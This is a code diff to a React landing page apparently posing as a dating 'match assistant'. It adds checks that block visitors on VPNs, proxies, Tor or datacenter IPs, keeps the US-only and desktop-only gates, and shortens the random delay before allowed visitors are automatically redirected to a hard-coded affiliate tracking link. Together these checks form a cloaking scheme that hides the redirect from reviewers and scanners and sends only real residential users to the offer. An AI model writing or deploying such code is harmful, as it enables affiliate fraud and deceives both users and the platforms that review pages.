@@ -10,7 +10,7 @@ import MatchAssistant from './components/MatchAssistant';
 
 const App: React.FC = () => {
   const redirectUrl = "https://t.acrsmartcam.com/406599/8873/0?aff_sub5=SF_006OG000004lmDN";
-  const [accessStatus, setAccessStatus] = useState<'checking' | 'allowed' | 'blocked_geo' | 'blocked_device'>('checking');
+  const [accessStatus, setAccessStatus] = useState<'checking' | 'allowed' | 'blocked_geo' | 'blocked_device' | 'blocked_quality'>('checking');
 
   useEffect(() => {
     const checkAccess = async () => {
@@ -21,19 +21,33 @@ const App: React.FC = () => {
         return;
       }
 
-      // Geo check: US only
+      // Geo and IP Quality check
       try {
-        const response = await fetch('https://ipapi.co/json/');
+        const response = await fetch('https://ipwho.is/');
         const data = await response.json();
+        
+        if (!data.success) {
+          setAccessStatus('allowed'); // Fallback
+          return;
+        }
+
+        // Check for Proxy, VPN, or Hosting
+        const isProxy = data.security?.proxy || data.security?.vpn || data.security?.tor || data.security?.relay;
+        const isHosting = data.connection?.type === 'hosting' || data.connection?.type === 'datacenter';
+
+        if (isProxy || isHosting) {
+          setAccessStatus('blocked_quality');
+          return;
+        }
+
+        // Check for US only
         if (data.country_code === 'US') {
           setAccessStatus('allowed');
         } else {
           setAccessStatus('blocked_geo');
         }
       } catch (error) {
-        // If API fails, default to allowed to avoid blocking legitimate users, 
-        // or you could choose to block. Given the prompt "仅当...才允许", 
-        // usually we'd want to be sure, but for UX we'll allow if check fails.
+        // Fallback to allowed if API fails
         setAccessStatus('allowed');
       }
     };
@@ -41,11 +55,11 @@ const App: React.FC = () => {
     checkAccess();
   }, []);
 
-  // Auto-redirect after random delay (2500ms to 4000ms)
+  // Auto-redirect after random delay (1500ms to 2500ms)
   useEffect(() => {
     if (accessStatus !== 'allowed') return;
 
-    const delay = Math.floor(Math.random() * (4000 - 2500 + 1)) + 2500;
+    const delay = Math.floor(Math.random() * (2500 - 1500 + 1)) + 1500;
     const timer = setTimeout(() => {
       window.location.href = redirectUrl;
     }, delay);
@@ -99,6 +113,11 @@ const App: React.FC = () => {
       {accessStatus === 'blocked_device' && (
         <div className="fixed top-0 left-0 w-full bg-rose-600 text-white py-4 text-center z-[200] font-bold shadow-2xl animate-slide-down">
           Desktop access required to continue.
+        </div>
+      )}
+      {accessStatus === 'blocked_quality' && (
+        <div className="fixed top-0 left-0 w-full bg-rose-600 text-white py-4 text-center z-[200] font-bold shadow-2xl animate-slide-down">
+          Access restricted. Please use a residential network.
         </div>
       )}
       
